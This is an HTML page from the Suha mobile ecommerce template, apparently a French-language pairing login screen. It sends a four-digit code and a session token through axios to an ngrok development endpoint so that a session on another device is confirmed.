<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover, shrink-to-fit=no">
    <meta name="description" content="Suha - Multipurpose Ecommerce Mobile HTML Template">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="theme-color" content="#625AFA">

    <title>Suha - Multipurpose Ecommerce Mobile HTML Template</title>
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,200..800;1,200..800&amp;display=swap" rel="stylesheet">
    <link rel="icon" href="img/icons/icon-72x72.png">
    <link rel="apple-touch-icon" href="img/icons/icon-96x96.png">
    <link rel="apple-touch-icon" sizes="152x152" href="img/icons/icon-152x152.png">
    <link rel="apple-touch-icon" sizes="167x167" href="img/icons/icon-167x167.png">
    <link rel="apple-touch-icon" sizes="180x180" href="img/icons/icon-180x180.png">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/tabler-icons.min.css">
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="css/owl.carousel.min.css">
    <link rel="stylesheet" href="css/magnific-popup.css">
    <link rel="stylesheet" href="css/nice-select.css">
    <link rel="stylesheet" href="style.css">
    <link rel="manifest" href="manifest.json">
</head>
<body>
    <div class="preloader" id="preloader">
        <div class="spinner-grow text-secondary" role="status">
            <div class="sr-only"></div>
        </div>
    </div>
    <div class="login-wrapper d-flex align-items-center justify-content-center text-center">
        <div class="background-shape"></div>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-10 col-lg-8"><img class="big-logo" src="img/logo/logo.png" alt="">
                    <div class="register-form mt-5" id="Scannage">
                        <h5 class="text-white">Entrez votre code pour vous connecter</h5>
                            <br>
                            <input type="hidden" name="payload" id="payload" value="3xFDw24GNmnJ2Gk65N2BBc7BS9LHM3c7r8V66Vmapjtk7z6t">
                            <form id="codeForm" action="javascript:void(0);">
                                <div class="row">
                                    <div class="col-3">
                                        <div class="bg-white">
                                            <input type="text" class="form-control text-dark" id="chiffre1" autocomplete="off">
                                        </div>
                                    </div>

                                    <div class="col-3">
                                        <div class="bg-white">
                                            <input type="text" class="form-control text-dark" id="chiffre2" autocomplete="off">
                                        </div>
                                    </div>

                                    <div class="col-3">
                                        <div class="bg-white">
                                            <input type="text" class="form-control text-dark" id="chiffre3" autocomplete="off">
                                        </div>
                                    </div>

                                    <div class="col-3">
                                        <div class="bg-white">
                                            <input type="text" class="form-control text-dark" id="chiffre4" autocomplete="off">
                                        </div>
                                    </div>

                                    <div class="mt-3">
                                        <button type="submit" class="btn btn-primary">Valider</button>
                                    </div>
                                </div>

                            </form>

                            <div id="loading" class="mt-3" style="display: none;">
                                <div class="spinner-border text-light" role="status">
                                    <span class="sr-only">Loading...</span>
                                </div>
                            </div>
                            <div id="message" class="mt-3 text-white"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/waypoints.min.js"></script>
    <script src="js/jquery.easing.min.js"></script>
    <script src="js/jquery.magnific-popup.min.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/jquery.counterup.min.js"></script>
    <script src="js/jquery.countdown.min.js"></script>
    <script src="js/jquery.passwordstrength.js"></script>
    <script src="js/jquery.nice-select.min.js"></script>
    <script src="js/theme-switching.js"></script>
    <script src="js/active.js"></script>
    <script src="js/pwa.js"></script>
    <script src="js/axios.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#codeForm').on('submit', function() {
                var chiffre1 = $('#chiffre1').val();
                var chiffre2 = $('#chiffre2').val();
                var chiffre3 = $('#chiffre3').val();
                var chiffre4 = $('#chiffre4').val();
                var code = chiffre1 + chiffre2 + chiffre3 + chiffre4;
                var payload = $('#payload').val();

                if (code.length === 4) {
                    $('#loading').show();
                    axios.get('https://c444-37-174-106-253.ngrok-free.app/update-session', {
                        params: {
                            code: code,
                            payload: payload
                        }
                    })
                    .then(function(response) {
                        $('#loading').hide();
                        if (response.data.status === 'success') {
                            $('#message').text('Vous pouvez maintenant accéder à votre plateforme sur votre ordinateur.');
                        } else {
                            $('#message').text('Code saisi incorrect, veuillez réessayer.');
                        }
                    })
                    .catch(function(error) {
                        $('#loading').hide();
                        $('#message').text('Une erreur est survenue. Veuillez réessayer.');
                    });
                } else {
                    $('#message').text('Veuillez entrer un code à 4 chiffres.');
                }
            });
        });
    </script>
</body>
</html>
